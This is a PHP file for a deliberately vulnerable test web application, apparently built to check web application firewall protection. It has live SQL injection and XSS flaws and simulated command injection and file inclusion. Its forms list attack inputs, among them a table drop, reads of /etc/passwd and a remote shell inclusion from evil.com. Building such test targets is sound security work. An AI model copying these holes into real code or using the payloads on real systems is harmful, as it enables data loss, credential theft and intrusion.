<?php
// WARNING: This is a deliberately vulnerable application for testing WAF protection
// DO NOT use this code in a production environment!

// Database connection simulation
function db_query($query) {
    // This function simulates a database query
    // In a real app, this would connect to a database
    echo "<div class='query'><strong>Query executed:</strong> $query</div>";
    return true;
}

// Display header
echo "<!DOCTYPE html>
<html>
<head>
    <title>Vulnerable Web Application</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; line-height: 1.6; }
        .container { max-width: 800px; margin: 0 auto; padding: 20px; border: 1px solid #ddd; }
        .query { background-color: #f5f5f5; padding: 10px; margin: 10px 0; border-left: 3px solid #007bff; }
        .warning { background-color: #fff3cd; padding: 10px; margin: 10px 0; border-left: 3px solid #ffc107; }
        .error { background-color: #f8d7da; padding: 10px; margin: 10px 0; border-left: 3px solid #dc3545; }
        .success { background-color: #d4edda; padding: 10px; margin: 10px 0; border-left: 3px solid #28a745; }
    </style>
</head>
<body>
    <div class='container'>
        <h1>Vulnerable Web Application</h1>
        <div class='warning'>
            <strong>Warning:</strong> This application contains deliberate security vulnerabilities for WAF testing purposes.
        </div>";

// --- SQL Injection Vulnerability ---
if (isset($_GET['id'])) {
    $id = $_GET['id'];
    echo "<h2>User Details</h2>";
    
    // VULNERABLE: Unsanitized input used directly in SQL query
    $query = "SELECT * FROM users WHERE id = $id";
    db_query($query);
    
    echo "<div>User ID: $id</div>";
}

// --- XSS Vulnerability ---
if (isset($_GET['input'])) {
    $input = $_GET['input'];
    echo "<h2>User Input</h2>";
    
    // VULNERABLE: Unsanitized input output directly to page
    echo "<div>You entered: $input</div>";
}

// --- Command Injection Vulnerability ---
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    echo "<h2>Command Output</h2>";
    
    // VULNERABLE: Unsanitized input passed to system command
    echo "<div>Executing command...</div>";
    echo "<pre>";
    // This is simulated for safety, but would be vulnerable if uncommented
    // system($cmd);
    echo "Command: $cmd\n";
    echo "(Simulated output for safety)";
    echo "</pre>";
}

// --- Local File Inclusion Vulnerability ---
if (isset($_GET['page'])) {
    $page = $_GET['page'];
    echo "<h2>Included Content</h2>";
    
    // VULNERABLE: Unsanitized input used in file inclusion
    echo "<div>Including file: $page</div>";
    echo "<div class='query'>";
    // This is simulated for safety, but would be vulnerable if uncommented
    // include($page);
    echo "(File inclusion simulated for safety)";
    echo "</div>";
}

// --- Default form for testing ---
echo "
        <h2>Test Vulnerabilities</h2>
        <form method='GET'>
            <h3>SQL Injection Test</h3>
            <input type='text' name='id' placeholder='Enter user ID' />
            <input type='submit' value='Get User' />
            <div class='error'>Example attacks: <code>1 OR 1=1</code>, <code>1; DROP TABLE users</code></div>
        </form>
        
        <form method='GET'>
            <h3>XSS Test</h3>
            <input type='text' name='input' placeholder='Enter some text' />
            <input type='submit' value='Submit' />
            <div class='error'>Example attack: <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></div>
        </form>
        
        <form method='GET'>
            <h3>Command Injection Test</h3>
            <input type='text' name='cmd' placeholder='Enter a command' />
            <input type='submit' value='Execute' />
            <div class='error'>Example attacks: <code>ls;cat /etc/passwd</code>, <code>ping -c 4 8.8.8.8</code></div>
        </form>
        
        <form method='GET'>
            <h3>File Inclusion Test</h3>
            <input type='text' name='page' placeholder='Enter file path' />
            <input type='submit' value='Include' />
            <div class='error'>Example attacks: <code>../../../etc/passwd</code>, <code>http://evil.com/shell.php</code></div>
        </form>
    </div>
</body>
</html>";
?>